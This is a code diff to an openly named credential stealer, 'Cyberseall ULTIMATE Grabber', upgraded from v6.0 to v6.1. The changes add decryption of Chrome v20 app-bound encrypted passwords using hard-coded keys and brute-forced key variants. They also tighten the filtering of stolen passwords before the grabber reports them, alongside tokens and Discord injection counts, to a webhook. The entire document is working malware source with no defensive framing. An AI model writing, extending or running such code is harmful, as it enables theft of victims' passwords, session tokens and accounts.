@@ -16,9 +16,14 @@ import psutil
 import subprocess
 
 try:
-    from Crypto.Cipher import AES
+    from Crypto.Cipher import AES, ChaCha20_Poly1305
 except:
     __import__('subprocess').run([__import__('sys').executable,'-m','pip','install','pycryptodome','--quiet'])
+    try:
+        from Crypto.Cipher import AES, ChaCha20_Poly1305
+    except:
+        from Crypto.Cipher import AES
+        ChaCha20_Poly1305 = None
 
 class CyberseallGrabber:
     def __init__(self, webhook_url):
@@ -414,9 +419,9 @@ class CyberseallGrabber:
                     if not password or len(password) < 3:
                         return "Failed to decrypt"
 
-                    # METHODE 1: Standard Chrome v10/v11 AES-GCM
+                    # METHODE 1: Chrome v10/v11/v20 AES-GCM
                     try:
-                        if password[:3] == b'v10' or password[:3] == b'v11':
+                        if password[:3] in [b'v10', b'v11', b'v20']:
                             iv = password[3:15]
                             encrypted_data = password[15:]
                             cipher = AES.new(key, AES.MODE_GCM, iv)
@@ -426,7 +431,47 @@ class CyberseallGrabber:
                     except:
                         pass
 
-                    # METHODE 2: Standard AES-GCM ohne Version-Check
+                    # METHODE 2: ULTIMATE v20 APP-BOUND ENCRYPTION
+                    try:
+                        if password[:3] == b'v20':
+                            # v20 verwendet App-Bound Encryption - versuche verschiedene Ansätze
+                            
+                            # Standard v20 Struktur: [v20|iv(12)|ciphertext|tag(16)]
+                            try:
+                                password_iv = password[3:3+12]
+                                encrypted_password = password[3+12:-16]
+                                password_tag = password[-16:]
+                                
+                                if len(password_iv) == 12 and len(password_tag) == 16:
+                                    cipher = AES.new(key, AES.MODE_GCM, nonce=password_iv)
+                                    decrypted_password = cipher.decrypt_and_verify(encrypted_password, password_tag)
+                                    result = decrypted_password.decode('utf-8', errors='ignore')
+                                    if result and len(result) >= 3:
+                                        return result
+                            except:
+                                pass
+                            
+                            # Fallback: Versuche verschiedene Strukturen
+                            for iv_start in [3, 4]:
+                                for iv_len in [12, 16]:
+                                    for tag_len in [16, 12]:
+                                        try:
+                                            if len(password) >= iv_start + iv_len + tag_len:
+                                                iv = password[iv_start:iv_start+iv_len]
+                                                encrypted_data = password[iv_start+iv_len:-tag_len]
+                                                tag = password[-tag_len:]
+                                                
+                                                cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
+                                                decrypted = cipher.decrypt_and_verify(encrypted_data, tag)
+                                                result = decrypted.decode('utf-8', errors='ignore')
+                                                if result and len(result) >= 3:
+                                                    return result
+                                        except:
+                                            pass
+                    except:
+                        pass
+
+                    # METHODE 3: Standard AES-GCM ohne Version-Check
                     try:
                         if len(password) >= 15:
                             iv = password[3:15]
@@ -438,7 +483,7 @@ class CyberseallGrabber:
                     except:
                         pass
 
-                    # METHODE 3: Direkter DPAPI
+                    # METHODE 4: Direkter DPAPI
                     try:
                         result = win32crypt.CryptUnprotectData(password, None, None, None, 0)
                         if result and result[1]:
@@ -448,7 +493,7 @@ class CyberseallGrabber:
                     except:
                         pass
 
-                    # METHODE 4: Erweiterte IV-Positionen und Tag-Längen
+                    # METHODE 5: Erweiterte IV-Positionen und Tag-Längen
                     try:
                         for iv_start in [0, 3, 12, 16]:
                             for iv_len in [8, 12, 16, 24]:
@@ -564,6 +609,121 @@ class CyberseallGrabber:
                             
                             if len(best_result) >= 6:
                                 return best_result
+                    except:
+                        pass
+
+                    # METHODE 12: V20 ALTERNATIVE SCHLÜSSEL-ABLEITUNG
+                    try:
+                        if password[:3] == b'v20':
+                            # v20 könnte eine andere Schlüssel-Ableitung verwenden
+                            import hashlib
+                            
+                            # Versuche verschiedene Schlüssel-Ableitungen
+                            key_variants = [
+                                key,
+                                hashlib.sha256(key).digest()[:32],  # SHA256 des Master Keys
+                                hashlib.md5(key).digest() * 2,      # MD5 doppelt
+                                key[:16] + key[:16],                # Erste 16 Bytes doppelt
+                                key[-16:] + key[-16:],              # Letzte 16 Bytes doppelt
+                            ]
+                            
+                            for variant_key in key_variants:
+                                if len(variant_key) >= 16:
+                                    for iv_start in [3, 4]:
+                                        for iv_len in [12, 16]:
+                                            try:
+                                                if len(password) >= iv_start + iv_len + 16:
+                                                    iv = password[iv_start:iv_start+iv_len]
+                                                    encrypted_data = password[iv_start+iv_len:]
+                                                    cipher = AES.new(variant_key[:16], AES.MODE_GCM, iv)
+                                                    decrypted = cipher.decrypt(encrypted_data[:-16])
+                                                    
+                                                    for encoding in ['utf-8', 'latin1', 'cp1252']:
+                                                        try:
+                                                            decoded = decrypted.decode(encoding, errors='ignore')
+                                                            clean_decoded = ''.join(c for c in decoded if 32 <= ord(c) <= 126)
+                                                            if len(clean_decoded) >= 6 and any(c.isalnum() for c in clean_decoded):
+                                                                return clean_decoded
+                                                        except:
+                                                            pass
+                                            except:
+                                                pass
+                    except:
+                        pass
+
+                    # METHODE 13: AGGRESSIVE CHROME PROFILE DECRYPTION
+                    try:
+                        # Spezielle Behandlung für Chrome Profile 3 und ähnliche
+                        if len(password) >= 20:
+                            # Versuche verschiedene Schlüssel-Derivationen
+                            for key_variant in [key, key[:16], key[-16:], key[8:24]]:
+                                if len(key_variant) >= 16:
+                                    for iv_offset in range(0, min(len(password), 20)):
+                                        for data_offset in range(iv_offset + 12, min(len(password), iv_offset + 32)):
+                                            try:
+                                                iv = password[iv_offset:iv_offset + 12]
+                                                if len(iv) == 12:
+                                                    encrypted_data = password[data_offset:]
+                                                    if len(encrypted_data) >= 16:
+                                                        cipher = AES.new(key_variant[:16], AES.MODE_GCM, iv)
+                                                        decrypted = cipher.decrypt(encrypted_data[:-16])
+                                                        # Versuche verschiedene Dekodierungen
+                                                        for encoding in ['utf-8', 'latin1', 'cp1252']:
+                                                            try:
+                                                                result = decrypted.decode(encoding, errors='ignore')
+                                                                # Filtere nur sinnvolle Passwörter
+                                                                clean_result = ''.join(c for c in result if 32 <= ord(c) <= 126)
+                                                                if len(clean_result) >= 6 and any(c.isalnum() for c in clean_result):
+                                                                    return clean_result
+                                                            except:
+                                                                pass
+                                            except:
+                                                pass
+                    except:
+                        pass
+
+                    # METHODE 14: BRUTE FORCE KEY DERIVATION
+                    try:
+                        if len(password) >= 15 and len(key) >= 16:
+                            # Versuche verschiedene Key-Transformationen
+                            key_variants = [
+                                key,
+                                key[::-1],  # Reversed key
+                                bytes(a ^ b for a, b in zip(key, b'\x5A' * len(key))),  # XOR with pattern
+                                key[1:] + key[:1],  # Rotated key
+                                key[::2] + key[1::2],  # Interleaved key
+                            ]
+                            
+                            for variant_key in key_variants:
+                                if len(variant_key) >= 16:
+                                    try:
+                                        iv = password[3:15]
+                                        encrypted_data = password[15:]
+                                        cipher = AES.new(variant_key[:16], AES.MODE_GCM, iv)
+                                        decrypted = cipher.decrypt(encrypted_data[:-16])
+                                        result = decrypted.decode('utf-8', errors='ignore')
+                                        clean_result = ''.join(c for c in result if 32 <= ord(c) <= 126)
+                                        if len(clean_result) >= 6 and any(c.isalnum() for c in clean_result):
+                                            return clean_result
+                                    except:
+                                        pass
+                    except:
+                        pass
+
+                    # METHODE 15: LEGACY CHROME DECRYPTION
+                    try:
+                        # Für ältere Chrome-Versionen ohne v10/v11 Prefix
+                        if not password.startswith(b'v1') and len(password) >= 16:
+                            try:
+                                # Direkter DPAPI ohne Prefix
+                                result = win32crypt.CryptUnprotectData(password, None, None, None, 0)
+                                if result and result[1]:
+                                    decrypted = result[1].decode('utf-8', errors='ignore')
+                                    clean_result = ''.join(c for c in decrypted if 32 <= ord(c) <= 126)
+                                    if len(clean_result) >= 3:
+                                        return clean_result
+                            except:
+                                pass
                     except:
                         pass
 
@@ -718,9 +878,53 @@ class CyberseallGrabber:
                         try:
                             with open(state_file, "r", encoding="utf-8") as f:
                                 local_state = json.loads(f.read())
+                                
+                                # Versuche zuerst App-Bound Key für v20 (falls verfügbar)
+                                app_bound_key = None
+                                try:
+                                    if "app_bound_encrypted_key" in local_state.get("os_crypt", {}):
+                                        # App-Bound Encryption für v20 - vereinfachte Version
+                                        app_bound_encrypted_key = local_state["os_crypt"]["app_bound_encrypted_key"]
+                                        if app_bound_encrypted_key:
+                                            # Versuche bekannte App-Bound Keys
+                                            aes_key = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
+                                            chacha20_key = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
+                                            
+                                            # Versuche verschiedene Schlüssel
+                                            for test_key in [aes_key, chacha20_key]:
+                                                try:
+                                                    # Vereinfachte App-Bound Entschlüsselung
+                                                    decoded_key = base64.b64decode(app_bound_encrypted_key)
+                                                    if len(decoded_key) > 60:
+                                                        flag = decoded_key[0] if len(decoded_key) > 0 else 0
+                                                        if flag in [1, 2]:
+                                                            iv = decoded_key[1:13]
+                                                            ciphertext = decoded_key[13:45]
+                                                            tag = decoded_key[45:61]
+                                                            
+                                                            if flag == 1:
+                                                                cipher = AES.new(test_key, AES.MODE_GCM, nonce=iv)
+                                                            elif flag == 2 and ChaCha20_Poly1305:
+                                                                cipher = ChaCha20_Poly1305.new(key=test_key, nonce=iv)
+                                                            else:
+                                                                continue
+                                                            
+                                                            app_bound_key = cipher.decrypt_and_verify(ciphertext, tag)
+                                                            break
+                                                except:
+                                                    continue
+                                except:
+                                    pass
+                                
+                                # Standard Master Key Extraktion
                                 encrypted_key = local_state["os_crypt"]["encrypted_key"]
                                 master_key = base64.b64decode(encrypted_key)[5:]
                                 master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
+                                
+                                # Verwende App-Bound Key falls verfügbar, sonst Master Key
+                                if app_bound_key:
+                                    master_key = app_bound_key
+                                    
                         except:
                             continue
 
@@ -763,25 +967,23 @@ class CyberseallGrabber:
                                             pass
                                     
 
-                                    if not decrypted_password or decrypted_password == "Failed to decrypt":
-                                        try:
-                                            if isinstance(encrypted_password, bytes) and len(encrypted_password) > 10:
-                                                readable = ''.join(chr(c) for c in encrypted_password if 32 <= c <= 126)
-                                                if len(readable) > 3:
-                                                    decrypted_password = f"Partial: {readable[:30]}"
-                                        except:
-                                            pass
-                                    
-
-                                    if decrypted_password and decrypted_password != "Failed to decrypt":
-                                        passwords.append({
-                                            "browser": browser_name,
-                                            "url": url,
-                                            "username": username,
-                                            "password": decrypted_password,
-                                            "times_used": 0,
-                                            "date_created": 0
-                                        })
+                                    # Nur vollständig entschlüsselte und saubere Passwörter hinzufügen
+                                    if (decrypted_password and 
+                                        decrypted_password != "Failed to decrypt" and
+                                        not decrypted_password.startswith("Partial:") and
+                                        len(decrypted_password) >= 3):
+                                        
+                                        # Prüfe auf korrupte Zeichen
+                                        clean_password = ''.join(c for c in decrypted_password if 32 <= ord(c) <= 126)
+                                        if len(clean_password) >= 3 and len(clean_password) == len(decrypted_password):
+                                            passwords.append({
+                                                "browser": browser_name,
+                                                "url": url,
+                                                "username": username,
+                                                "password": decrypted_password,
+                                                "times_used": 0,
+                                                "date_created": 0
+                                            })
 
                             cursor.close()
                             conn.close()
@@ -1958,7 +2160,7 @@ module.exports = require('./core.asar');
 
             embed_fields = [
                 {
-                    "name": "CYBERSEALL ULTIMATE GRABBER v6.0",
+                    "name": "CYBERSEALL ULTIMATE GRABBER v6.1",
                     "value": f"```Browser Passwords: {total_passwords}\nBrowser History: {total_history}\nAutofill Data: {total_autofill}\nRaw Tokens: {total_tokens}\nValid Tokens: {valid_tokens}\nKeyword Files: {total_files}\nVPNs Found: {total_vpns}\nGaming Accounts: {total_games}\nDiscord Injections: {total_injections}```",
                     "inline": False
                 },
@@ -2049,7 +2251,7 @@ module.exports = require('./core.asar');
                     "description": "**COMPLETE DATA EXTRACTION WITH DISCORD INJECTION**",
                     "color": 0xff0000,
                     "fields": embed_fields,
-                    "footer": {"text": "Cyberseall ULTIMATE v6.0 - Browser, History, Autofill, VPN, Gaming & Discord Stealer"},
+                    "footer": {"text": "Cyberseall ULTIMATE v6.1 - Browser, History, Autofill, VPN, Gaming & Discord Stealer"},
                     "timestamp": time.strftime('%Y-%m-%dT%H:%M:%S.000Z', time.gmtime())
                 }]
             }
